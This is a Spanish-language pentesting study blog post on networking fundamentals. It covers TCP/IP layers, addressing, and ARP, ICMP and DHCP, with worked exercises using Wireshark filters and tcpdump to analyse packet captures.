---
layout: post
title: Networking
subtitle: Basics Net Concepts.
tags: [pen]
---
### 1. Networking Fundamentals.

Un pentester debe ser un individuo bien versado en conceptos fundamentales de Networking. 

<br />

#### 1.1. TCP/IP model Layer.

Un modelo de red es una descripción del curso que siguen los paquetes cuando estos viajan a través de dos ordenadores. Uno de los modelos más empleados es el  modelo TCP/IP que se compone de cuatro capas: 

- 4. Capa de aplicación.
- 3. Capa de transporte.
- 2. Capa de internet.
- 1. Capa enlace.

<br />

##### 4.0.3.1.1. Link Layer.

Las redes que consisten únicamente en dispositivos físicos son vulnerables a las *colisiones*. Las colisiones ocurren cuando más de un dispositivo transmite paquetes en un segmento de red al mismo tiempo. El objetivo principal de esta capa es reducir las colisiones en la red física.

Con mucho, la tecnología más destacada y extendida que se usa para conectar dispositivos en la capa de enlace hoy en día se llama *Ethernet* . Ethernet nos permite formar límites lógicos alrededor de dispositivos conectados físicamente a través del concepto de *conmutadores* o *puentes* de red . Los conmutadores esencialmente reducen la cantidad de máquinas que pueden colisionar en una red grande al dividirla en redes de redes más pequeñas. Cualquier dispositivo en la red puede llegar a la interfaz de red de cualquier otro dispositivo invocando su dirección MAC.

Las direcciones MAC se construyen concatenando seis bytes (números hexadecimales de 8 bits), por ejemplo, "11:22:33:44:55:66".

Esto significa que hay 2^48 o más de 281 _billones_ de direcciones MAC posibles. Debido a que hay tantas direcciones MAC potenciales, teóricamente son globalmente únicas. La primera mitad de la dirección MAC se duplica como un *Identificador Único Organizacional (OUI)*, lo que también ayuda a garantizar la unicidad.

Cuando un dispositivo quiere enviar información a otro dispositivo en la red, incluye tanto su propia dirección MAC como la dirección MAC del receptor previsto en cada trama. Aquí es donde entra en juego el *Protocolo de resolución de direcciones* (Address Resolution Protocol) que se encarga de asociar una IP con una MAC.

<br />

**Exercises**

**¿Cuál es la PDU de la capa del modelo TCP/IP en la que opera Ethernet?**

Frame

<br />

**¿Qué address utiliza la capa de enlace de datos**?

Mientras que la capa de internet trabaja con IPs, la capa de enlace de datos trabaja con MACs.

<br />

**¿Qué dispositivos de fragmentación de redes operan a este nivel?**

Switch

<br />

<br />

##### 4.0.3.1.2. Capa de Internet.

La capa de Internet se usa cuando queremos permitir que los dispositivos se conecten a través de redes, es decir, cuando estos dispositivos no se encuentran en la misma red local, esta información ya ha sido adherida en la capa anterior. El Protocolo de Internet (IP) es el que se ocupa para permitir que esto suceda mediante el uso de *direcciones IP*. (Usaremos el término "dirección IP" para referirnos a las direcciones *IPv4* . IPv4 es la cuarta versión de IP y la más utilizada en la actualidad.)

Para construir una dirección IP, tomamos cuatro octetos y los concatenamos para formar un número entero de 32 bits. Para cada uno de los cuatro octetos, se elige un número entre 1 y 255. Estos valores se llaman octetos porque *2^8 = 256*. Un ejemplo de una dirección IP es 192.168.127.16.

Dado que cada octeto es independiente de los demás, este esquema de direccionamiento puede permitirnos crear *2^8^4* o *2^32* direcciones que es un número menor que el número de dispositivos conectados a internet actualmente.

Como hay menos IPs que dispositivos, se emplean subredes que operan bajo una *máscara de subred* usa el mismo formato numérico que una dirección IP, por lo que puede resultar un poco confuso. Al igual que las direcciones IP, también se construyen concatenando cuatro octetos. A diferencia de las direcciones IP, por lo general comienzan con el valor "255" (por ejemplo, 255.255.255.0 o 255.255.0.0).

A cada red se le asigna una máscara de subred, que ayuda a definir qué direcciones IP pueden existir dentro de esa misma red pero no fuera. De esta forma se distinguen entre IPs públicas e IPs privadas.

Comprender los detalles completos de cómo funcionan las máscaras de subred está más allá del alcance de este tema. Proporcionaremos una breve introducción, así como algunos recursos adicionales, para complementar su comprensión.

Primero debemos notar que las direcciones IP que mencionamos anteriormente solo se escriben como octetos por conveniencia y legibilidad. Una dirección IP también se puede representar como un número binario simple de 32 bits. Aquí está la dirección anterior (192.168.127.16) escrita como binario:

```
11000000101010000111111100010000
```

Podemos volver a agregar los puntos entre cada byte para mayor legibilidad:

```
11000000.10101000.01111111.00010000
```

A continuación, nos damos cuenta de que las máscaras de subred se pueden representar en el mismo formato. La máscara de subred 255.255.255.0, por ejemplo, sería:

```
11111111.11111111.11111111.00000000
```

En principio esta máscara de red estaría asociada a una subred cuyos dispositivos tendrían IPs con los tres primeros octetos iguales; 192.168.127.X, es decir, que esta máscara de red tendría los tres primeros octetos fijos de forma que sería una red que tendría cabida para tan sólo 255 dispositivos (observemos que el X.X.X.1 sería la IP privada de la red asociada al router).

<br />

##### 4.0.3.1.3. Capa de Transporte.

Mientras que IP se encarga de enrutar mensajes hacia y desde sistemas a través de diferentes redes a través de direcciones IP, los protocolos de nivel de transporte intentan asegurarse de que los mensajes lleguen a su destino previsto a tiempo y en el orden correcto.

TCP es quizás el protocolo de capa de transporte más común. Permite la comunicación bidireccional mediante el establecimiento de una sesión entre máquinas. Una sesión TCP se inicia mediante lo que se denomina el protocolo de enlace de tres vías. Así es como funciona:

*Paso 1*: la máquina A envía un paquete con un indicador llamado *SYN* (o sincronizar) a la máquina B.

*Paso 2*: la máquina B recibe el indicador SYN y devuelve un paquete con el indicador *SYN-ACK* para reconocer la máquina A.

*Paso 3*: La máquina A recibe el SYN-ACK y finalmente envía un indicador *ACK* para confirmar la máquina B.

Con estos tres pasos, ambas máquinas saben de forma fiable que cada una de ellas está recibiendo los mensajes de la otra. La sesión ahora está abierta y las dos máquinas ahora pueden enviar segmentos de ida y vuelta.

Además de la función de sesiones robustas, TCP agrega el concepto de *puertos*. Mientras que un paquete IP requiere que el remitente especifique una dirección IP, un segmento TCP (que recordemos que por una cuestión de encapsulación ya tiene la información del paquete IP) requiere que el remitente especifique un número de puerto entre 0 y 65535 (2^16 - 1). Los puertos del 0 al 1023 se consideran puertos conocidos y los servicios de red extremadamente populares los utilizan con frecuencia (a saber, TELNET, SSH, etc). Esencialmente, los puertos TCP permiten que una máquina abra múltiples sesiones de comunicación al mismo tiempo.

Algunos servicios de red no requieren la comunicación bidireccional confiable proporcionada por TCP y simplemente necesitan enviar y recibir mensajes unidireccionales. En lugar de pasar por el trabajo de establecer una sesión (esto es, de abrir un canal de comunicación fiable) una máquina que transmite a través de UDP simplemente envía su mensaje y asume que la otra máquina lo ha recibido.

Observemos así que la principal diferencia entre TCP y UDP es la necesidad de asegurarse que la información llega a su destino a costa de la velocidad de transmisión, esto hace a UDP más rápido en contraste con TCP.

<br />

##### 4.0.3.1.4. Capa de Applicación.

Ya hemos cubierto varios protocolos de nivel inferior del modelo TCP/IP. Las siguientes secciones abordan muy brevemente algunos de los protocolos de la capa de aplicación más comunes.

- *HTTP* es el protocolo de la web. Especifica reglas para que los clientes web recuperen contenido de los *servidores web*. HTTP usa más comúnmente el puerto 80. Tradicionalmente, los navegadores web usarían el puerto 80 como el puerto predeterminado si no se especifica en la URL. Sin embargo, recientemente, los desarrolladores de navegador comenzaron a establecer el puerto predeterminado en 443, que a menudo ejecuta un cifrado de HTTP, llamado HTTPS. HTTP utiliza una serie de *requests* generadas por un cliente y *responses* generadas por un servidor para permitir una comunicación flexible y eficiente.

- *FTP* permite que un cliente se conecte, explore, envíe y recupere archivos hacia y desde un servidor. Es útil conocer FTP desde una perspectiva de seguridad, ya que permite descubrir información que puede no estar tan supervisada o reforzada como otros servicios de red. Cuando se usa TCP, FTP generalmente opera en el puerto 21. FTP se considera un protocolo completamente orientado a la sesión, porque una vez que se establece una conexión, el cliente puede continuar interactuando con el servidor hasta que finaliza la sesión. UDP tiene una contraparte de FTP, que se ejecuta en el puerto 69, llamado TFTP. A diferencia de FTP, TFTP simplemente permite la transferencia o recuperación única de archivos. Lo dejaremos como trivia para que el estudiante investigue qué significa la T en TFTP.

- *SMTP* es uno de varios protocolos de capa de aplicación dedicados al correo electrónico. Al igual que con otros protocolos, SMTP describe una conversación o negociación entre dos partes: un remitente y un receptor. Cuando se escribe un correo electrónico, lo primero que sucede después de presionar _enviar_ es que el mensaje se transfiere desde el dispositivo local del remitente a su _servidor de correo_ remoto. Luego, este servidor de correo saliente negocia con el servidor de correo _entrante_ del destinatario . SMTP describe la forma en que los dos servidores de correo deben interactuar para validar el papel del otro en el proceso de comunicación. SMTP rige la comunicación de un remitente a su servidor de correo y de su servidor de correo al del destinatario. En otras palabras, se utiliza sólo para _enviar_ correo electrónico. Otros protocolos describen cómo un destinatario puede recuperar el correo electrónico desde un servidor de correo. SMTP también tiende a ejecutarse en un puerto especial conocido, el puerto 25. SMTP envía mensajes mientras que los protocolos IMAP y POP3 los extrae del mailbox.

<br />

#### 1.2. Data Packets & Analisis I (WireShark). 

##### 1.2.1. Traffic, Packet Captures and Wireshark.

**Intro**

Cuando los datos se mueven a través de una red, se envían y reciben en unidades llamadas paquetes. Podemos pensar en un paquete como un pequeño contenedor que incluye tanto un mensaje como metainformación sobre el mensaje.

La transferencia de muchos paquetes a través de una red se denomina *tráfico de red*. Fundamentalmente, el tráfico de la red se puede rastrear o capturar a través de las herramientas de *captura de paquetes*.

<br />

**Wireshark**

Varias herramientas diferentes pueden ayudarnos a interceptar y registrar el tráfico de la red. Estos pueden ser útiles tanto para los atacantes como para los defensores. Por ejemplo, un atacante podría usar una herramienta de este tipo para obtener autenticación sin cifrar en un servidor web. Mientras tanto, un defensor podría usar la misma herramienta para detectar la presencia del atacante en la red.

Muchas herramientas de captura de paquetes pueden guardar datos para su uso posterior, a menudo utilizando el formato de archivo .pcap. Esto puede ser muy útil, especialmente porque un pcap generado en un dispositivo puede abrirse y analizarse en otro dispositivo o incluso en un sistema operativo diferente.

Las bibliotecas de software *Libpcap, Winpcap y Npcap* implementan la funcionalidad de captura de paquetes. Estas bibliotecas son las que nos permitirán guardar el tráfico capturado en archivos .pcap. Los archivos que contienen tráfico de red capturado generalmente se denominan simplemente "archivos pcap", sin el punto.

Wireshark es una aplicación que se puede utilizar para capturar el tráfico de red. Por lo general, se usa a través de una GUI optimizada, pero también tiene una versión CLI llamada tshark. 

Wireshark se puede usar para escuchar u *snifar* el tráfico de la red en vivo, y también se puede usar para analizar un archivo pcap generado previamente.

Para iniciar Wireshark a través de la GUI de Kali podemos abrir una terminal y teclear WireShark.

```bash
sudo wireshark
```

<br />

**Filtros de captura**

Wireshark, además de desplegar, información que extrae de los paquetes de red que captura, también permite la inserción de filtros que permite desplegar tan sólo aquellos paquetes que coincidan coon undeterminado patrón.

Por ejemplo, si sólo queremos ver aquellos paquetes que vayan dirigidos a un determinado host podemos utilizar el filtro:

```bash
host <IP>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223160134.png' | relative_url }}" text-align="center"/>
</div>

Wireshark contiene una lista de filtros accesible mediante 'Alt+C' > Capture Filters:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223160706.png' | relative_url }}" text-align="center"/>
</div>

A la izquierda vemos lo que pretendemos haer y a la derecha la secuencia a introducir para lograr nuestro propósito.

<br />

**Interfaces de red**

Una interfaz de red o simplemente interfaz es un dispositivo, ya sea físico o virtual, que permite que dos máquinas se pongan en contacto entre ellas. 

- *Eth0* representa la tarjeta de red físicamente instalada en un ordenador que permite al mismo ponerse en contacto con otros dispositivos dentro de la red local.

- Tun0 o Tap0 son interfaces de red que ofrecen comunicación a través de una VPN. 

<br />

**Exercises**

**Vuelva a abrir Wireshark en su máquina Kali y configure un filtro de captura para el host http.kali.org. Luego, navegue a http.kali.org usando Firefox. ¿Qué dirección IP pertenece a http.kali.org?**

En primer lugar, utilizamos el filtro *http* para capturar paquetes http y seguidamente acudimos con el buscador Firefox a http.kali.org y volvemos sobre Wirshark, inspeccionando las request HTTP obtendremos que la IP es 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223172611.png' | relative_url }}" text-align="center"/>
</div>

<br />

**¿En qué protocolo se comunica el primer paquete de la captura?**

Ahora, lo que pretendemos desde Wireshark es desplegar toda la comunicación entre nuestra máquina y dicha IP, para ello empleamos el filtro:

```wireshark
ip.addr == 192.99.200.113
```

Obteniendo que el primer paquete tiene el protocolo TCP.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223172908.png' | relative_url }}" text-align="center"/>
</div>

<br />

**¿Cuántos paquetes se transmiten antes del primer paquete HTTP?**

Atendiendo a la imágen anterior podemos observar que se mandan 3, esto concuerda con el saludo de inicio de sesión del protocolo tcp 3-Way-Handshake en el que se mandan un SYN, se devuelve un SYN-ACK y se termina por mandar un ACK.

<br />

##### 1.2.2. Using Wireshark: Display Filters.

Ahora que tenemos a Wireshark escuchando el tráfico que viaja hacia o desde http.kali.org, filtremos los paquetes que podemos monitorear en la interfaz de usuario con *Display Filters* (filtros de visualización). A diferencia de un filtro de captura, un filtro de visualización no afecta los datos que intercepta Wireshark. En su lugar, simplemente aplica una máscara temporal en los paquetes que no se ajustan a los criterios definidos. También podemos elegir un filtro de una lista predefinida yendo al menú Analyze (o usando Alt + A ), y luego seleccionando Display Filters...

En el campo *Display Filter*, escribimos *http* y presionemos 'Return' para aplicar un filtro de visualización que solo muestre los paquetes _del Protocolo de transferencia de hipertexto_ (HTTP). 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227115915.png' | relative_url }}" text-align="center"/>
</div>

En la imagen de arriba, hemos seleccionado el paquete que contiene el texto visible en el navegador Firefox. 

La pantalla gráfica de Wireshark tiene tres secciones principales:

- La sección superior nos permite seleccionar qué paquete queremos analizar. El paquete que elijamos cambiará el contexto de las secciones central e inferior.

- La sección intermedia nos permite analizar un paquete específico en varios niveles, según el protocolo que nos interese. Más adelante trataremos este concepto de _capas de protocolo_ con más detalle.

- Finalmente, la sección inferior nos permite inspeccionar el contenido sin procesar del paquete seleccionado en formato hexadecimal, junto con una traducción a ASCII (donde esté disponible).

Cuando hayamos terminado con nuestra captura, podemos guardarla en un archivo. La capacidad de guardar y cargar pcaps nos da bastante versatilidad. Por ejemplo, es posible que queramos guardar algo de tráfico durante un compromiso de seguridad inalámbrica para poder analizar el tráfico de nuestra oficina más tarde. Para guardar una captura de paquete, vaya a Archivo > Guardar (o presione Ctrl + S).

<br />

**Exercises**

**Busque a través de los paquetes generados por la solicitud a http.kali.org. Hay un archivo que devuelve un mensaje 404. ¿Cuál es esa URI?**

Activamos a Wireshark y filtramos la interfaz 'eth0' por el protocolo HTTP. Seguidamente desde Firefox acudimos a 'http.kali.org' y revisamos el tráfico capturado:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227122135.png' | relative_url }}" text-align="center"/>
</div>

Observamos un paquete de respuesta que tiene por número 404 (Not found) a la izquierda, las flechas del campo 'No.' sugieren que está relacionado con la request 'GET /favicon.ico'. Por tanto a URI es http.kali.org/favicon.ico.

<br />

**Cierre la captura de _http.kali.org_ y realice otra captura mientras navega a www.offensive-security.com. Intente establecer un filtro de visualización para http. ¿Qué tecnología de seguridad evita que Wireshark capture o muestre datos http? Este ejercicio puede requerir alguna investigación externa.**

Una forma sencilla de evitar el filtrado de paquetes es cifrarlos con TLS.

<br />

##### 1.2.3. Opening PCAP files.

Descargamos el fichero y lo abrimos con Wireshark.

- En la parte inferior derecha podemos encontrar que el número de paquetes capturados en el fichero son 32488.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227132053.png' | relative_url }}" text-align="center"/>
</div>

- Podemos invocar el filtro 'ip.addr\=\=172.16.40.10' para ver el tráfico que involucra dicha IP obteniendo que la IP se relaciona con 208.68.234.99.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227132437.png' | relative_url }}" text-align="center"/>
</div>

- En Statistics > Capture File Properties podemos ver las propiedades del fichero, entre ellas, propiedades medias de los paquetes capturados:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227133134.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.3. Data Packets & Analisis II (WireShark & TCPDump).

##### 1.3.1. Following TCP streams & Exporting objects in Wireshark.

En esta unidad de aprendizaje, continuaremos aprendiendo sobre funciones más avanzadas en Wireshark y comenzaremos a explorar *Tcpdump*.

Hasta ahora, hemos estado usando Wireshark para ver el tráfico de red secuencialmente en el orden en que los paquetes viajaron a lo largo del tiempo. Sin embargo, a menudo nos interesan más los *flujos* de datos entre varios clientes y servidores. Al seleccionar un flujo de datos, Wireshark debe aplicar un tipo específico de filtro de visualización que nos permite ver la conversación entre un cliente y un servidor. Wireshark tiene una poderosa capacidad para volver a ensamblar una sesión específica y mostrarla en varios formatos.

En Wireshark, abra el archivo de captura flow_and_export.pcap . Primero, hagamos clic en los paquetes secuencialmente y determinemos si podemos averiguar qué sucedió en esta sesión. A menos que ya esté familiarizado con la lectura de paquetes, puede pasar algún tiempo antes de que sea evidente. Esta es una situación en la que usar un flujo de datos será muy útil. Una vez que se vuelve a ensamblar un flujo de datos, es mucho más fácil leer el historial de la sesión.

Primero, haga clic con el botón derecho en el primer paquete de la captura y seleccione *Follow* > *TCP Stream*. Se abrirá una nueva ventana, donde podemos observar que un usuario parece haber iniciado sesión correctamente en algún servicio.

En el lado derecho, justo encima del botón *Find Next* , podemos seleccionar otros flujos de datos capturados en el pcap actual. Al leer rápidamente cada uno de los flujos, podemos obtener una buena descripción general de alto nivel de la actividad de la red que generó nuestro pcap.

Wireshark puede exporta datos que se encuentran dentro de una captura de paquetes. Esta es una forma elegante de decir que guardamos y revisamos varios tipos de datos que pueden ayudarnos en una prueba de penetración o para defender nuestra red.

Por ejemplo, si solo estamos interesados ​​en unos pocos paquetes específicos en nuestra captura, podemos usar el menú *Archivo* > *Exportar paquetes específicos...* para guardar un nuevo archivo pcap más pequeño.

Wireshark tiene una amplia gama de tipos de datos que se pueden exportar. Una de las opciones más interesantes desde el punto de vista de la seguridad es la capacidad de exportar *objetos*. Al exportar un objeto, podemos recrear y guardar cualquier archivo de interés que haya sido transferido durante la grabación del pcap. Dentro del menú *File* > *Export Objets*, encontramos que Wireshark admite la exportación de objetos para varios protocolos de capa de aplicación. Al hacer clic en un protocolo, Wireshark escaneará y mostrará todos los objetos identificados en los flujos de datos de ese protocolo. Luego podemos guardar los objetos que nos gustaría evaluar más a fondo en nuestro disco local.

<br />

**Exercises**

**1.  Seleccione el menú _Exportar objetos_ y determine a qué protocolos de aplicación se ha hecho referencia en el pcap. ¿Puede encontrar el archivo de imagen alojado por la máquina en 10.10.10.2? ¿Cuál es la extensión del archivo?**

Acudimos a File > Export Objects > HTTP y observamos que la extensión del archivo es jpeg:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227174934.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2.  ¿Cuántos flujos de datos TCP se pueden reconstruir a partir del pcap? (proporcionar el número solamente)**

Pulsamos Botón derecho > Follow > TCP Stream sobre un paquete y en la parte inferior subimos hasta que no podamos más. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227180142.png' | relative_url }}" text-align="center"/>
</div>

El número de streams es el máximo número que podamos subir +1.

<br />

**3.  ¿Qué sitio web relacionado con la seguridad de la información se visitó en esta sesión?**

Filtramos el contenido de los paquetes por el protocolo HTTP y revisando la parte de uno de los paquetes por la sección HTTP encontramos que el host es 'www.offensive-security.com'.

<br />

**4.  ¿Qué es el User-Agent en las solicitudes HTTP GET?**

Sobre un paquete que lleve una solicitud GET, inspeccionamos las cabeceras y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227181152.png' | relative_url }}" text-align="center"/>
</div>

<br />

**5. ¿Qué nombre de usuario se utilizó para iniciar sesión en el servicio FTP el 10.10.10.2?**

Revisando el campo 'info' de todos los paquetes interceptados podemos ver uno con el nombre del usuario.

<br />

**6. ¿Cuál es la bandera contenida en flag.jpg?**

Aplicamos el filtro HTTP y seleccionamos el paquet que contiene el 'GET /flag.jpg' request y localizamos la respuesta al GET que contendrá dicha imagen indicado con una flecha:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227190225.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, sobre la respuesta que contiene la imagen, inspeccionamos el contenido del paquete y sobre el campo 'File Data' pulsamos el botón derecho y seleccionamos Export Packet Bytes:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227191416.png' | relative_url }}" text-align="center"/>
</div>

Guardamos el contenido en un fichero y seguidamente lo abrimos con el comando:

```bash
open flag.jpg
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227191509.png' | relative_url }}" text-align="center"/>
</div>

<br />

##### 1.3.2. TCPDump.

*Tcpdump* es un *cli* que tiene como función interceptar y mostrar tráfico de red. Es por mucho la herramienta de línea de comandos de inspección de tráfico de red más utilizada disponible.

```bash
kali@kali:~$ sudo tcpdump
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

De manera predeterminada, *tcpdump* capturará el tráfico en vivo que pasa a través de la red cuando se ejecuta sin modificadores. Al igual que Wireshark, también puede leer y analizar archivos de captura existentes. Para cargar un archivo de captura con tcpdump, use el interruptor -r y especifique la ruta al archivo que desea abrir en su máquina local.

Tcpdump nos permite filtrar datos de la misma manera que Wireshark. Por ejemplo, podemos usar los filtros de host de origen (src host) o de destino (dst host) para generar solo tráfico de origen o de destino, respectivamente.

Tenga en cuenta que el source se refiere al origen de un paquete y el destino indica a dónde fue.

También podemos filtrar por número de puerto (puerto XYZ) para mostrar el tráfico contra un puerto determinado, o por nombre de protocolo como FTP o HTTP. También es posible negar un filtro específico usando la palabra clave _not_ . El uso de la palabra clave _not_ nos permite decirle a tcpdump que intercepte todos los datos que no están restringidos por nuestra definición.

Una de las razones más convincentes para usar una herramienta de línea de comandos como tcpdump sobre una interfaz gráfica como Wireshark es que la línea de comandos puede ofrecer una flexibilidad casi ilimitada.

Al ejecutar tcpdump, también debemos guardar los paquetes que estamos grabando. Para hacer eso, necesitamos usar el modificador -w . Esto nos permitirá analizar los paquetes ya sea con tcpdump o Wireshark. Una vez que tenemos la grabación del archivo, debemos presionar Ctrl + C .

Dado que la entrada y salida de tcpdump es solo texto, podemos canalizarlo hacia o desde otros comandos. Esto puede ser extremadamente poderoso. Por ejemplo, podemos canalizar tcpdump en el comando wc -l para contar fácilmente el número de líneas de salida de una captura. Alternativamente, podemos canalizar tcpdump en el comando cat -n para mostrar los números de línea.

<br />

**Exercises**

**1. ¿Qué bandera puede permitirnos especificar una interfaz para que tcpdump escuche?**

'-i'

<br />

**2. ¿Cuántos paquetes en total se guardan dentro de la captura?**

```bash
tcpdump -r <filename> | wc -l
```

<br />

**3. ¿Cuántos paquetes en la captura son tráfico ARP?**

```bash
tcpdump -r <filename> | grep ARP | wc -l
```

<br />

**4.  ¿Cuántos paquetes en la captura _no_ son tráfico ICMP?**

```bash
tcpdump -r <filename> | grep -v ICMP | wc -l 
```

#### 1.4. TCP/IP Helper Protocol (ARP).

En esta unidad de aprendizaje, cubriremos los protocolos que no son necesariamente los principales actores del modelo TCP/IP, pero que desempeñan funciones de soporte clave que permiten que todo el conjunto funcione bien en conjunto. Distinguimos entre: ARP, ICMP y DHCP.

<br />

##### 1.4.1. Address Resolution Protocol.

El _Protocolo de resolución de direcciones_ (ARP) es un protocolo de la capa de enlace que está diseñado para asociar direcciones de la capa de red (Direcciones IP) a direcciones de capa de enlace (Direcciones MAC). Esto permite que los switchers transmitan Ethernet's frames (Recordamos que 'frame' es el término que hace referencia a la unidad de información asociada a la capa de enlace) a sus dispositivos de destino previstos en una _red de área local_ (LAN).

Podemos recordar que las máquinas no conocen inherentemente las direcciones MAC de las demás. ARP les permite comunicarse especificando reglas que pueden seguir para saber qué dirección MAC pertenece cada IP.

La máquina A comienza el protocolo *transmitiendo* un frame que contiene tres datos:

1.  La fuente, que es la propia dirección MAC de la máquina.

2.  El destino, ff:ff:ff:ff:ff:ff como destino. Esta es una dirección especial que significa _difusión_ y permite que todas las máquinas de la red reciban el frame.

3.  Un string: "¿Quién tiene la dirección IP que pertenece a la Máquina B? Informe a la Máquina A" se envía.

La máquina A envía este marco y luego la máquina B la recibe. Debido a la información incluida en el marco transmitido, la Máquina B ahora conoce la dirección MAC de la Máquina A. La Máquina B luego responde con su marco, que también contiene tres datos:

1. Su dirección MAC como 'source'.

2. La dirección MAC de la máquina A como 'destination'.

3. Una cadena, que de nuevo se traduce aproximadamente al inglés, dice: "Mi dirección IP está en _esta_ dirección MAC".

La máquina A ahora conoce las direcciones IP y MAC de la máquina B y almacena esa información en su *ARP caché*. Cuando quiera enviar marcos posteriores, ahora puede buscar la información correcta dentro del caché. La Máquina B puede entonces iniciar el mismo procedimiento para aprender y almacenar las direcciones de la Máquina A.

ARP tiene su propio comando, *arp* , que le permite mostrar o manipular el caché de la red. Examinemos cuál es la tabla ARP predeterminada para nuestra máquina virtual Kali.

<br />

##### 1.4.2. Internet Control Messaging Protocol (ICMP).

El _Protocolo de mensajería de control de Internet_ (ICMP) es un protocolo de la capa de transporte de TCP/IP dado que la información se encapusla después de la IP, sin embargo es mayormente considerado un protocolo de la capa de internet (capa 3) debido a su función de mantenimiento de la infraestructura de la red. 

Concretamente, desempeña una función de soporte crucial: cuando hay un problema con la recepción de datos, alerta al remitente con varios tipos de mensajes de error. Por lo general, no transmite datos en sí mismo, aparte de estos códigos de error.

ICMP normalmente funciona en el fondo de las actividades de red y no suele ser invocado directamente por un usuario final. Una excepción importante a esto es el acto de hacer *ping* a una máquina. Ping es una herramienta bastante omnipresente que envía repetidamente mensajes ICMP a un objetivo. Esto puede permitirnos probar la conectividad de la red al informarnos si podemos llegar al destino. También prueba la *latencia* de conectividad entre las dos máquinas. Mide tanto el tiempo que tarda el paquete ICMP en llegar a su destino como el tiempo que tarda en recibir una confirmación. Estos valores se suman y se devuelven al remitente, generalmente en milisegundos.

<br />

**Exercises**

**1. ¿Qué tamaño en bytes suele enviar un paquete ICMP mediante ping, incluido el encabezado ICMP?**

64

<br />

**2. Abra el archivo _arp_and_icmp.pcap_ en Wireshark. ¿Cuántos paquetes ICMP recibió la máquina en 192.168.49.144?**

```bash
tcpdump -r 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap | grep ICMP | grep '> 192.168.49.144' | wc -l
```

<br />

**3. ¿Con qué dirección IP pudo comunicarse más rápido la máquina en 192.168.49.134 a través de ICMP?**

Por un lado, en el output el tiempo de transmisión puede verse separado por un punto después de la hora de envío del paquete, así, cogemos todas estas cantidades y las ordenamos de menor a mayor con el siguiente comando:

```bash
tcpdump -r 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap | grep ICMP | grep '192.168.49.134 >' | cut -d " " -f1 | cut -d '.' -f2 | sort -n | head -n 1

reading from file 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap, link-type EN10MB (Ethernet), snapshot length 262144
034464

```

Este comando, coge todos los paquetes ICMP enviados por 192.168.49.134, selecciona el tiempo de envío, los ordena de menor a mayor y coge la primera cantidad. Seguidamente utilizamos el siguiente comando para obtener la IP asociada a esta velocidad:

```bash
 tcpdump -r 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap | grep ICMP | grep '192.168.49.134 >' | grep 034464 | cut -d '>' -f2 | cut -d ':' -f1        

reading from file 13d19bd93a49b9413077ada36228d940-arp_and_icmp.pcap, link-type EN10MB (Ethernet), snapshot length 262144
10.10.10.24
```

<br />



##### 1.4.3. Dynamic Host Configuration Protocol (DHCP)

El *Protocolo de configuración dinámica de host* (DHCP) ayuda a garantizar que cualquier máquina nueva que se una a una red pueda interactuar con las máquinas existentes para recibir una dirección IP única y correctamente configurada. En contraste con ICMP, DHCP asume un papel activo en la prevención de problemas en lugar de simplemente informar sobre ellos.

DHCP logra su objetivo a través de la centralización. Se utiliza un servidor DHCP para asignar una dirección IP a cada host que se une a su red. Podemos pensar en el servidor DHCP como si entregara una especie de ticket a cada máquina. Cada boleto contiene un número único y solo es válido durante un período de tiempo predeterminado.

DHCP se comporta de manera similar. Cada máquina que se une a la red recibe una dirección IP única y solo se le permite conservarla o *arrendarla* durante un tiempo definido antes de que deba registrarse con el servidor DHCP para revalidarla.

El proceso comienza cuando una computadora se conecta a la red y pregunta: "¿Algún servidor DHCP aquí?". Esto se llama DHCP Discover.

El servidor DHCP responde con una oferta de DHCP. Esencialmente, "Estoy aquí y puedo darle la dirección IP 192.168.1.11" (O cualquier dirección IP que esté disponible).

La computadora responde con una solicitud de DHCP, "Claro, gracias".

Finalmente, el servidor DHCP responde con un DHCP ACK. Esto asigna la dirección IP y le dice a la computadora la máscara de subred de la red, su dirección de puerta de enlace predeterminada y su(s) dirección(es) del servidor de nombres de dominio (DNS). También le dice a la computadora cuánto tiempo tiene la dirección IP antes de necesitar revalidarla.

<br />

**Exercises**

**1. ¿Qué protocolo de capa de transporte utiliza DHCP?**

UDP

**2. El período de tiempo durante el cual una máquina puede mantener su dirección IP asignada por DHCP se denomina: _____**

Lease

**3.  Abra el archivo _dhcp_capture.pcap_ en Wireshark. ¿Cuál es la dirección IP del servidor DHCP?**

Observamos la captura de Wireshark de cerca:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221228180726.png' | relative_url }}" text-align="center"/>
</div>

Observamos que en primer lugar se envía un mensaje de difusión con una request DHCP y seguidamente el servidor DHCP responde devolviendo el DHCP ACK.

**4.  ¿Qué dirección IP ofrece el servidor DHCP al cliente DHCP?**

Siguiendo con la captura anterior podemos observar que la última dirección a la que se dirigen los paquetes envíados por el servidor DHCP es el 172.16.92.135

**5.  En la captura de paquetes, ¿qué paquetes tienen una longitud más corta, la "Request" o el "ACK" de DHCP?**

Reques

**6.  ¿Por cuánto tiempo en minutos se asignan las direcciones IP?**

